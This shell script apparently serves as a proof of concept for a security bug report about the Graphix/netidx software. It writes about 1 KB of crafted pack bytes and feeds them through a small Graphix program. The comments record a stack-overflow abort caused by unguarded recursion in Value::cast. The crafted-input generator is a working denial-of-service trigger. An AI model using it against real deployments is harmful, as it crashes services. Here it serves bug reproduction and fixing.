#!/bin/sh
# x-security-03: 1 KB of crafted pack bytes aborts the process: unguarded
# recursion in netidx Value::cast, reached from convert (graphix-types/src/typ/cast.rs).
# usage: sh x-security-03.sh /path/to/graphix [depth]
#   timeout -s KILL 60 sh x-security-03.sh ~/tmp/target/debug/graphix 300
# expected: "ok" (or a catchable error) at any depth
# observed (debug build, HEAD 7324207f): depth 100 prints "ok"; depth 300, 500,
#   50000: "thread 'tokio-rt-worker' has overflowed its stack / fatal runtime
#   error: stack overflow, aborting". gdb: hundreds of alternating
#   Value::cast / Value::cast::{closure#4} frames under convert, under
#   Type::cast_inner/cast_int (the guarded Graphix walk).
n=${2:-500}
d=$(mktemp -d)
python3 -I -c "open('$d/deep.pack','wb').write(bytes([19,1])*$n+bytes([16]))"
cat > $d/p.gx <<GX
type T = [null, Array<T>];
sys::exit(sys::time::after_idle(duration:500.ms, 0));
let b = sys::fs::read_all_bin("$d/deep.pack")\$;
let v: [T, Error<[\`PackErr(string), \`InvalidCast(string)]>] = pack::read(b);
select v { error as e => "err", _ => "ok" }
GX
"$1" --no-cache $d/p.gx
